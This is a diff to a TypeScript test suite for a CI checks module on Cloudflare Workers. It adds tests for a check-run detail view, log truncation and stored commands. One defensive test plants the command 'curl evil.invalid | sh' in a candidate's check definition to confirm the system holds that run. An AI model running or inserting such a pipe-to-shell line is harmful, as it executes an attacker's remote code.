@@ -3,6 +3,7 @@ import type { RunnerOptions } from "@cloudflare/ci/worker";
 import { introspectWorkflowInstance, runInDurableObject } from "cloudflare:test";
 import { env } from "cloudflare:workers";
 import { describe, expect, it, vi } from "vitest";
+import { MAX_CHECK_DETAIL_LOG_BYTES } from "@railhead/shared/board-api";
 import {
   AttemptTable,
   MAX_CHECK_LOG_BYTES,
@@ -29,6 +30,7 @@ import {
   type CheckRunParams,
 } from "../src/checks/workflow";
 import { fail, ok, type PortResult } from "../src/contracts/result";
+import { unavailableChecks } from "../src/contracts/unavailable";
 import type { CheckAttempt, CheckPort, CheckReport } from "../src/contracts/train";
 import { composeRepo, type RepoContext, type RepoPorts } from "../src/repo/composeRepo";
 import { EventLog } from "../src/repo/eventLog";
@@ -42,6 +44,7 @@ import { CHECK_DEADLINE_MS, createTrain } from "../src/modules/train/scheduler";
 import { repoObjectName, type Repo } from "../src/repo/RepoObject";
 import { MAX_SANDBOX_LIFETIME_MS, type Admission } from "../src/sandbox/admission";
 import type { SandboxPolicy } from "../src/sandbox/policy";
+import { queueing } from "./trainQueue";
 
 const MAIN = "1".repeat(40);
 const CANDIDATE = "2".repeat(40);
@@ -51,6 +54,7 @@ const NOW = 1_800_000_000_000;
 const HOST = `${"0".repeat(32)}.artifacts.cloudflare.net`;
 const MAIN_REPO = "rh-m-main";
 const SANDBOX = `sbx-${"f".repeat(32)}`;
+const COMMAND = "pnpm test";
 
 const encoder = new TextEncoder();
 
@@ -276,6 +280,8 @@ interface Harness {
   repository: FakeRepository;
   world: World;
   attempts: AttemptTable;
+  /** The object's SQL storage. */
+  sql: SqlStorage;
   /** Whether the Worker is configured for checks; when not, `main` is `null`. */
   configure: (configured: boolean) => void;
 }
@@ -291,7 +297,7 @@ function withChecks(body: (harness: Harness) => Promise<void>): Promise<void> {
       log: EventLog.open(state.storage, repoId),
       clock: () => NOW,
       env,
-      wake: () => {},
+      wake: async () => true,
     };
     const world = new World();
     const repository = new FakeRepository();
@@ -352,6 +358,7 @@ function withChecks(body: (harness: Harness) => Promise<void>): Promise<void> {
       repository,
       world,
       attempts,
+      sql: state.storage.sql,
       configure: (value) => {
         configured = value;
       },
@@ -790,6 +797,145 @@ describe("checks.report", () => {
   });
 });
 
+describe("checks.detail", () => {
+  it("shows a started run, then its reported failure, with the command main's definition gave it", async () => {
+    await withChecks(async (harness) => {
+      const digest = await started(harness);
+
+      expect(await harness.checks.detail(ATTEMPT)).toEqual(
+        ok({
+          checkRunId: ATTEMPT,
+          candidate: CANDIDATE,
+          expectedMain: MAIN,
+          definitionDigest: digest,
+          command: COMMAND,
+          state: { kind: "started", deadline: harness.world.created[0]?.params.slot.deadline },
+        }),
+      );
+
+      await harness.checks.report({
+        attemptId: ATTEMPT,
+        candidate: CANDIDATE,
+        digest,
+        result: "fail",
+        log: "1 failed",
+        finishedAt: NOW + 5,
+      });
+
+      expect(await harness.checks.detail(ATTEMPT)).toEqual(
+        ok(
+          expect.objectContaining({
+            command: COMMAND,
+            state: {
+              kind: "reported",
+              result: "fail",
+              finishedAt: NOW + 5,
+              logTail: "1 failed",
+              logCut: false,
+            },
+          }),
+        ),
+      );
+    });
+  });
+
+  it("shows a held run with the paths it edited and main's command, never the candidate's", async () => {
+    await withChecks(async ({ checks, repository }) => {
+      repository.commit(CANDIDATE, {
+        [CHECK_DEFINITION_PATH]: definitionText({ command: "curl evil.invalid | sh" }),
+        "acceptance/a.test.ts": "expect(413)",
+      });
+      await checks.start(await attempt());
+
+      const detail = await checks.detail(ATTEMPT);
+
+      expect(detail).toEqual(
+        ok(
+          expect.objectContaining({
+            command: COMMAND,
+            state: { kind: "held", paths: [CHECK_DEFINITION_PATH] },
+          }),
+        ),
+      );
+    });
+  });
+
+  it("returns only the end of a long log and says so, and all of one at the bound", async () => {
+    await withChecks(async (harness) => {
+      const digest = await started(harness);
+      const report = {
+        attemptId: ATTEMPT,
+        candidate: CANDIDATE,
+        digest,
+        result: "fail" as const,
+        log: `${"x".repeat(MAX_CHECK_DETAIL_LOG_BYTES)}tail`,
+        finishedAt: NOW,
+      };
+      await harness.checks.report(report);
+
+      const detail = await harness.checks.detail(ATTEMPT);
+      if (!detail.ok || detail.value.state.kind !== "reported") throw new Error("not reported");
+      expect(encoder.encode(detail.value.state.logTail).byteLength).toBe(
+        MAX_CHECK_DETAIL_LOG_BYTES,
+      );
+      expect(detail.value.state.logTail.endsWith("tail")).toBe(true);
+      expect(detail.value.state.logCut).toBe(true);
+      // The stored output is longer: only the answer is cut.
+      const stored = harness.attempts.get(ATTEMPT)?.state;
+      expect(stored?.kind === "reported" && stored.log).toBe(report.log);
+    });
+
+    await withChecks(async (harness) => {
+      const digest = await started(harness);
+      const log = "y".repeat(MAX_CHECK_DETAIL_LOG_BYTES);
+      await harness.checks.report({
+        attemptId: ATTEMPT,
+        candidate: CANDIDATE,
+        digest,
+        result: "pass",
+        log,
+        finishedAt: NOW,
+      });
+
+      const detail = await harness.checks.detail(ATTEMPT);
+      if (!detail.ok || detail.value.state.kind !== "reported") throw new Error("not reported");
+      expect(detail.value.state.logTail).toBe(log);
+      expect(detail.value.state.logCut).toBe(false);
+    });
+  });
+
+  it("refuses a malformed id and an attempt it never recorded, reading nothing else", async () => {
+    await withChecks(async ({ checks, world }) => {
+      expect(await checks.detail("not-a-run")).toEqual(
+        fail("invalid_request", "Not a check run id."),
+      );
+      expect(await checks.detail(ATTEMPT)).toEqual(
+        fail("not_found", "No record of that check run is kept."),
+      );
+      expect(world.admissions).toEqual([]);
+      expect(world.created).toEqual([]);
+    });
+  });
+
+  it("reports no command for an attempt stored before commands were kept", async () => {
+    await withChecks(async (harness) => {
+      await started(harness);
+      // A row written under the first schema step has no command.
+      harness.sql.exec("UPDATE check_attempts SET command = NULL");
+
+      const detail = await harness.checks.detail(ATTEMPT);
+
+      expect(detail.ok && detail.value.command).toBeNull();
+    });
+  });
+
+  it("fails as unavailable while the checks module is missing", async () => {
+    expect(await unavailableChecks.detail(ATTEMPT)).toEqual(
+      fail("unavailable", "The checks module is not available."),
+    );
+  });
+});
+
 /** The identity of the `i`th attempt on the candidate. */
 function identity(i: number) {
   return {
@@ -809,8 +955,9 @@ describe("the attempt table", () => {
   it("keeps at most its bound, dropping the oldest settled attempts and never a live started one", async () => {
     await withChecks(async ({ attempts }) => {
       // A run whose sandbox deadline is still ahead may yet report.
-      attempts.start(identity(0), SANDBOX, NOW, 0);
-      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1) attempts.hold(identity(i), ["a"], i);
+      attempts.start(identity(0), COMMAND, SANDBOX, NOW, 0);
+      for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1)
+        attempts.hold(identity(i), COMMAND, ["a"], i);
 
       expect(attempts.get(identity(0).attemptId)?.state.kind).toBe("started");
       expect(attempts.get(identity(1).attemptId)).toBeNull();
@@ -824,7 +971,7 @@ describe("the attempt table", () => {
       // More abandoned runs than the bound, each recorded long after the one before it ended.
       for (let i = 0; i < MAX_STORED_ATTEMPTS + 8; i += 1) {
         const now = NOW + i * 2 * REPORT_GRACE_MS;
-        attempts.start(identity(i), SANDBOX, now, now);
+        attempts.start(identity(i), COMMAND, SANDBOX, now, now);
         ids.push(identity(i).attemptId);
       }
 
@@ -835,16 +982,17 @@ describe("the attempt table", () => {
 
   it("keeps a started attempt until its report window has passed", async () => {
     await withChecks(async ({ attempts }) => {
-      attempts.start(identity(0), SANDBOX, NOW, NOW);
-      for (let i = 1; i < MAX_STORED_ATTEMPTS; i += 1) attempts.hold(identity(i), ["a"], NOW + i);
+      attempts.start(identity(0), COMMAND, SANDBOX, NOW, NOW);
+      for (let i = 1; i < MAX_STORED_ATTEMPTS; i += 1)
+        attempts.hold(identity(i), COMMAND, ["a"], NOW + i);
 
       // At one millisecond before the window closes, a held attempt goes instead.
-      attempts.hold(identity(MAX_STORED_ATTEMPTS), ["a"], NOW + REPORT_GRACE_MS - 1);
+      attempts.hold(identity(MAX_STORED_ATTEMPTS), COMMAND, ["a"], NOW + REPORT_GRACE_MS - 1);
       expect(attempts.get(identity(0).attemptId)?.state.kind).toBe("started");
       expect(attempts.get(identity(1).attemptId)).toBeNull();
 
       // Once it has closed, the abandoned run is the oldest settled attempt.
-      attempts.hold(identity(MAX_STORED_ATTEMPTS + 1), ["a"], NOW + REPORT_GRACE_MS);
+      attempts.hold(identity(MAX_STORED_ATTEMPTS + 1), COMMAND, ["a"], NOW + REPORT_GRACE_MS);
       expect(attempts.get(identity(0).attemptId)).toBeNull();
     });
   });
@@ -854,7 +1002,7 @@ describe("the attempt table", () => {
       const digest = await started(harness);
       const late = NOW + 2 * REPORT_GRACE_MS;
       for (let i = 1; i <= MAX_STORED_ATTEMPTS; i += 1)
-        harness.attempts.hold(identity(i), ["a"], late);
+        harness.attempts.hold(identity(i), COMMAND, ["a"], late);
 
       const result = await harness.checks.report({
         attemptId: ATTEMPT,
@@ -953,6 +1101,7 @@ async function startedRepository(): Promise<{
     const now = Date.now();
     new AttemptTable(state.storage).start(
       { attemptId, candidate: CANDIDATE, expectedMain: MAIN, digest },
+      COMMAND,
       SANDBOX,
       now + 60_000,
       now,
@@ -1193,7 +1342,7 @@ describe("the checks module as the Repo composes it", () => {
         log: EventLog.open(state.storage, repoId),
         clock: Date.now,
         env: configured,
-        wake: () => {},
+        wake: async () => true,
       });
       const definitions = await ports.checks.definitions(MAIN);
       const first = await ports.checks.start(attemptFor(check.definition));
@@ -1225,7 +1374,7 @@ describe("the checks module as the Repo composes it", () => {
         log: EventLog.open(state.storage, repoId),
         clock: Date.now,
         env,
-        wake: () => {},
+        wake: async () => true,
       });
       return ports.checks.start(await attempt());
     });
@@ -1297,19 +1446,34 @@ describe("a held check through the train", () => {
         log: EventLog.open(state.storage, repoId),
         clock: () => now,
         env: configured,
-        wake: (at) => wakes.push(at),
+        wake: async (at) => {
+          wakes.push(at);
+          return true;
+        },
       };
       const composed = composeRepo(context);
       const ports = (): RepoPorts => ({
         ...composed,
-        claims: { ...composed.claims, pin: async () => ok(pin) },
-        decisions: { ...composed.decisions, requirements: async () => ok([]) },
+        claims: {
+          ...composed.claims,
+          pin: async () => ok(pin),
+          currentGeneration: () => pin.generation,
+          readyPin: () => ({ pin, episode: 1, decisions: [] }),
+        },
+        decisions: {
+          ...composed.decisions,
+          requirements: async () => ok([]),
+          currentVersions: () => [],
+        },
         mainWriter: { ...composed.mainWriter, head: async () => ok(MAIN) },
-        merge: { compose: async () => ok({ kind: "clean", candidate: CANDIDATE }) },
+        merge: {
+          compose: async () => ok({ kind: "clean", candidate: CANDIDATE }),
+          discard: async () => ok({ removed: 1 }),
+        },
       });
-      const train = createTrain(context, ports);
+      const train = queueing(createTrain(context, ports), context.log);
 
-      await train.enqueue(pin);
+      await train.enqueue(pin, 1);
       const first = train.batches(1)[0];
       const blockedOutcome = await train.drive();
       const wakeWhileHeld = wakes.at(-1);
